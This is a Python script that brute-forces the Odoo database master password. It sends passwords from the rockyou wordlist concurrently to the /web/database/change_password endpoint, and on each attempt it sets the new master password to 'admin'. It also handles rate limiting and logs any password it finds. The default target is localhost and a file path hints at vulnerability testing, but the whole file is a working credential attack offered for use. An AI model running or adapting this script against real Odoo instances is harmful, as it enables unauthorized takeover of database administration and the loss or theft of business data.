import aiohttp
import asyncio
from bs4 import BeautifulSoup
from aiohttp import ClientConnectorError, ClientResponseError
import time
import sys
import os
from typing import AsyncIterator, Optional, Tuple
import logging
from urllib.parse import urljoin

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('odoo_password_test.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class OdooPasswordTester:
    def __init__(
        self,
        base_url: str = "http://localhost:8069",
        max_concurrent: int = 20,
        timeout: int = 50,
        request_timeout: int = 15
    ):
        self.base_url = base_url.rstrip('/')
        self.change_pwd_url = urljoin(self.base_url, "/web/database/change_password")
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.request_timeout = request_timeout
        self.successful_password = None
        self.tested_count = 0
        self._tasks = set()

    async def test_password(
        self,
        session: aiohttp.ClientSession,
        password: str,
        semaphore: asyncio.Semaphore
    ) -> Tuple[str, bool]:
        """Test a single password against Odoo instance"""
        try:
            async with semaphore:
                try:
                    payload = {
                        "master_pwd": password,
                        "master_pwd_new": "admin",
                    }
                    
                    async with session.post(
                        self.change_pwd_url,
                        data=payload,
                        timeout=self.request_timeout,
                        allow_redirects=False
                    ) as response:
                        text = await response.text()
                        soup = BeautifulSoup(text, 'html.parser')
                        
                        if response.status == 200:
                            if soup.find("div", class_="alert alert-warning"):
                                return (password, True)
                            if soup.find("div", class_="alert alert-danger"):
                                return (password, False)
                        
                        if response.status == 429:
                            logger.warning("Rate limited detected, consider slowing down")
                            await asyncio.sleep(1)
                            return (password, False)
                            
                        return (password, False)
                        
                except (ClientConnectorError, ClientResponseError, asyncio.TimeoutError) as e:
                    logger.warning(f"Error testing password {password}: {str(e)}")
                    return (password, False)
                except Exception as e:
                    logger.error(f"Unexpected error: {str(e)}")
                    return (password, False)
                finally:
                    self.tested_count += 1
                    if self.tested_count % 100 == 0:
                        logger.info(f"Tested {self.tested_count} passwords...")
        except asyncio.CancelledError:
            logger.debug(f"Password test for {password} was cancelled")
            return (password, False)

    async def password_generator(self, file_path: str, max_passwords: int = None) -> AsyncIterator[str]:
        """Async generator for passwords from file"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                count = 0
                for line in f:
                    password = line.strip()
                    if password:
                        yield password
                        count += 1
                        if max_passwords and count >= max_passwords:
                            break
        except FileNotFoundError:
            logger.error(f"Password file not found: {file_path}")
            raise

    async def run_attack(self, password_file: str, max_passwords: int = None) -> Optional[str]:
        """Run the password testing attack"""
        semaphore = asyncio.Semaphore(self.max_concurrent)
        connector = aiohttp.TCPConnector(
            limit=self.max_concurrent,
            force_close=True,
            enable_cleanup_closed=True
        )
        
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        start_time = time.time()
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'Connection': 'keep-alive'}
        ) as session:
            try:
                async for password in self.password_generator(password_file, max_passwords):
                    if self.successful_password:
                        break
                        
                    task = asyncio.create_task(
                        self.test_password(session, password, semaphore))
                    self._tasks.add(task)
                    task.add_done_callback(lambda t: self._tasks.discard(t))
                    task.add_done_callback(self.check_result)
                
                await asyncio.gather(*self._tasks, return_exceptions=True)
            except asyncio.CancelledError:
                logger.info("Cancellation received, cleaning up...")
                await self._cancel_pending_tasks()
                raise
            except Exception as e:
                logger.error(f"Attack failed: {str(e)}")
                await self._cancel_pending_tasks()
                raise
        
        elapsed = time.time() - start_time
        logger.info(f"Tested {self.tested_count} passwords in {elapsed:.2f} seconds")
        logger.info(f"Passwords per second: {self.tested_count/elapsed:.2f}")
        
        return self.successful_password

    async def _cancel_pending_tasks(self):
        """Cancel all pending tasks"""
        for task in self._tasks:
            if not task.done():
                task.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()

    def check_result(self, task: asyncio.Task):
        """Callback to check task result and stop if password found"""
        try:
            if task.cancelled():
                return
                
            password, success = task.result()
            if success:
                # Use a lock or make this check atomic
                if not self.successful_password:
                    self.successful_password = password
                    logger.critical(f"SUCCESS! Valid password found: {password}")
                    # Immediately cancel all other tasks
                    asyncio.create_task(self._cancel_pending_tasks())
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"Task error: {str(e)}")


async def main():
    # Configuration
    ODOO_URL = "http://localhost:8069"
    PASSWORD_FILE = "C:\\Users\\cocol\\Documents\\BandIT\\odooVulnerabilility\\odooscan\\data\\userenum\\rockyou.txt"
    MAX_PASSWORDS = 1000  # Set to None for unlimited
    CONCURRENT_REQUESTS = 5
    
    tester = OdooPasswordTester(
        base_url=ODOO_URL,
        max_concurrent=CONCURRENT_REQUESTS,
        timeout=60,
        request_timeout=15  # Increased from 5 to 15
    )
    
    try:
        valid_password = await tester.run_attack(PASSWORD_FILE, MAX_PASSWORDS)
        if not valid_password:
            logger.info("No valid password found in the tested set")
    except Exception as e:
        logger.error(f"Attack failed: {str(e)}")
    finally:
        logger.info("Password testing completed")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Program interrupted by user")
    except Exception as e:
        logger.error(f"Fatal error: {str(e)}")